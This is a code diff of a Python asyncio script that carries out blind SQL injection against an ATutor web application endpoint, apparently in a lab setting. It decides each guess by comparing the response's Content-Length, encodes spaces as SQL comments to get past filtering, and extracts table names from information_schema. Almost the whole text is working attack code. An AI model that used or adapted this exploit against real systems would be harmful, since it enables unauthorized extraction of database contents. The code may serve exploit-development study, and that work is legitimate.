@@ -31,14 +31,7 @@ async def run_until_found(tasklist: List):
             break
     map(lambda x: x.cancel(), tasks)
     return response
-# here we specify the condition that lets us infer the result of a query from the response 
-def response_truth_condition(response): 
-    content_length = int(response.headers['Content-Length'])
-    # in burp the content length is 246 but here it's 180, idk why
-    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
-    if (content_length == 180):
-        return True
-    return False
+
 async def blind_query(session:aiohttp.client.ClientSession,  response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
                       url:str, sub_query:str, ordinal:str = "",
                       query_encoder:Callable[[str], str]=None, debug:bool=False
@@ -55,25 +48,9 @@ async def blind_query(session:aiohttp.client.ClientSession,  response_truth_cond
             return False
     except aiohttp.client_exceptions.ServerDisconnectedError:
         return False
-async def blind_query_binary_search(session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
-                      ip:str, sub_query:str, sub_query_cmp_value:str = "",
-                      query_encoder:Callable[[str], str]=None, debug:bool=False
-                      ):
-    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
-    try:
-        async with session.get(target) as res:
-            if debug == True:
-                print("target: ", target)
-                print("response headers: ", res.headers)
-                print("response: ", res.content)
-            if (response_truth_condition(res)):
-                return sub_query_cmp_value if sub_query_cmp_value else True
-            return False
-    except aiohttp.client_exceptions.ServerDisconnectedError:
-        return False   
 async def question(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
-        return await blind_query(session, response_truth_condition, url, sub_query, query_encoder=query_encoder)
+        return await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, sub_query=sub_query, query_encoder=query_encoder)
 async def get_length(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_length = [
@@ -141,6 +118,14 @@ async def report(url:str, response_truth_condition:Callable[[aiohttp.client_reqr
         tables.append(await get_string(url, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i], query_encoder=query_encoder))
         print(tables[i], ":", table_name_lengths[i])
     '''
+# here we specify the condition that lets us infer the result of a query from the response 
+def response_truth_condition(response): 
+    content_length = int(response.headers['Content-Length'])
+    # in burp the content length is 246 but here it's 180, idk why
+    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
+    if (content_length == 180):
+        return True
+    return False
 try:
     asyncio.run(report("http://atutor/ATutor/mods/_standard/social/index_public.php?q=",response_truth_condition=response_truth_condition, query_encoder=lambda s: s.replace(' ','/**/')))
 # https://github.com/MagicStack/uvloop/issues/349
